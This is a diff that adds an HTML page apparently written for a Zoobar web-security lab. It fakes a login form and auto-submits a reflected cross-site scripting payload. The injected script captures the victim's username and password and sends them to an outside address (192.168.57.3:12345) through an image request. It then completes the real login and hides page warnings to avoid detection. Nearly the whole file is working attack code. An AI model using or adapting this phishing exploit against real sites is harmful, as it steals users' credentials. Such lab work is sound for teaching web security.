@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>
+      Login - Zoobar Foundation
+    </title>
+  </head>
+  <body>
+    <div id="login" class="centerpiece" style="display: none;">
+      <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
+        <table>
+          <tr>
+            <td>Username:</td>
+            <td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
+          </tr>
+          <tr>
+            <td>Password:</td>
+            <td colspan=2>
+              <input type="password" name="login_password" size=20 autocomplete="no">
+              <input type="submit" name="submit_login" value="Log in">
+              <input type="submit" name="submit_registration" value="Register">
+            </td>
+          </tr>
+        </table>
+        <input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+      </form>
+    </div>
+    <script>
+      document.loginform.elements["login_username"].value='"><script>' +
+                            'window.onload = function(){' +
+                            'document.loginform.elements["submit_login"].onclick=function(e){' +
+                            'e.preventDefault();' +
+                            'var login_username = document.loginform.elements["login_username"].value;' +
+                            'var login_password = document.loginform.elements["login_password"].value;' +
+                            'var image = new Image();' +
+                            'image.src = "http://192.168.57.3:12345?payload=" + login_username + "," + login_password + "&roll=14026&random=" + Math.random() + "&timestamp=" + Math.floor(Date.now());' +
+                            'image.onerror = function(){' +
+                            'var newinput = document.createElement("input");' +
+                            'newinput.name = "submit_login";' +
+                            'newinput.value = "Log in";' +
+                            'newinput.type = "hidden";' +
+                            'document.loginform.appendChild(newinput);' +
+                            'document.loginform.submit();' +
+                            '};' +
+                            '};' +  
+                            '};' +
+                            '<' + '/script><style>#warning{display:none;}.footer{display:none;}<' +
+                            '/style><input type = "hidden';
+      document.loginform.submit();                         
+    </script>
+  </body>
+</html>
